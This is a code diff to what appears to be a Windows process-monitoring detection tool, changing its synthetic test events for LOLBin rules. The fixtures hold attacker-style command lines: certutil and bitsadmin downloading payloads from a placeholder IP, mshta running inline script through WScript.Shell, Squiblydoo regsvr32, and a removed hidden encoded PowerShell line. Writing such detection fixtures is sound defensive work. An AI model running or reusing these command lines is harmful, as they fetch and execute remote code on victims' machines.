@@ -169,7 +169,7 @@ class ProcessCollector:
                 logger.error("Failed to persist event (PID %d) to SQLite: %s", event.pid, exc)
 
     def _stream_mock_events(self) -> Iterator[ProcessEvent]:
-        """Yield synthetic Windows process creation events for testing single & sequential rules."""
+        """Yield synthetic Windows process creation events testing core LOLBin rules."""
         sample_events = [
             # 1. Benign background service
             ProcessEvent(
@@ -182,7 +182,7 @@ class ProcessCollector:
                 integrity_level="System",
                 creation_time=datetime.now(timezone.utc).isoformat(),
             ),
-            # 2. Stage 1: LOLBin download cradle via certutil
+            # 2. Rule 1 & Rule 2: Office application (winword.exe) spawning certutil with -urlcache and http://
             ProcessEvent(
                 pid=6832,
                 ppid=3912,
@@ -192,36 +192,36 @@ class ProcessCollector:
                     r"http://198.51.100.42/payload.bin C:\ProgramData\update.bin"
                 ),
                 user=r"WORKSTATION\StandardUser",
-                parent_image=r"C:\Windows\System32\cmd.exe",
-                integrity_level="Medium",
-                creation_time=datetime.now(timezone.utc).isoformat(),
-            ),
-            # 3. Stage 2: Suspicious scriptlet execution by same user completing SEQ-LOLBIN-001
-            ProcessEvent(
-                pid=7100,
-                ppid=6832,
-                image=r"C:\Windows\System32\mshta.exe",
-                command_line=r"mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell\"\"\"))",
-                user=r"WORKSTATION\StandardUser",
-                parent_image=r"C:\Windows\System32\cmd.exe",
-                integrity_level="Medium",
-                creation_time=datetime.now(timezone.utc).isoformat(),
-            ),
-            # 4. Office parent spawning hidden encoded PowerShell
-            ProcessEvent(
-                pid=7416,
-                ppid=5200,
-                image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
-                command_line=(
-                    r"powershell.exe -NoP -W Hidden -Enc "
-                    r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
-                ),
-                user=r"WORKSTATION\StandardUser",
                 parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                 integrity_level="Medium",
                 creation_time=datetime.now(timezone.utc).isoformat(),
             ),
-            # 5. Squiblydoo regsvr32 execution
+            # 3. Rule 3: Suspicious bitsadmin download transfer from external URL
+            ProcessEvent(
+                pid=7050,
+                ppid=2210,
+                image=r"C:\Windows\System32\bitsadmin.exe",
+                command_line=(
+                    r"bitsadmin.exe /transfer updateJob /download /priority high "
+                    r"http://198.51.100.42/stage2.exe C:\ProgramData\stage2.exe"
+                ),
+                user=r"WORKSTATION\StandardUser",
+                parent_image=r"C:\Windows\System32\cmd.exe",
+                integrity_level="Medium",
+                creation_time=datetime.now(timezone.utc).isoformat(),
+            ),
+            # 4. Rule 4: Mshta executing inline javascript
+            ProcessEvent(
+                pid=7100,
+                ppid=7050,
+                image=r"C:\Windows\System32\mshta.exe",
+                command_line=r'mshta.exe javascript:a=new(ActiveXObject)("WScript.Shell");a.Run("calc.exe",0);close()',
+                user=r"WORKSTATION\StandardUser",
+                parent_image=r"C:\Windows\System32\cmd.exe",
+                integrity_level="Medium",
+                creation_time=datetime.now(timezone.utc).isoformat(),
+            ),
+            # 5. Rule 5: Regsvr32 Squiblydoo proxy execution loading remote scriptlet via scrobj.dll
             ProcessEvent(
                 pid=8104,
                 ppid=6120,
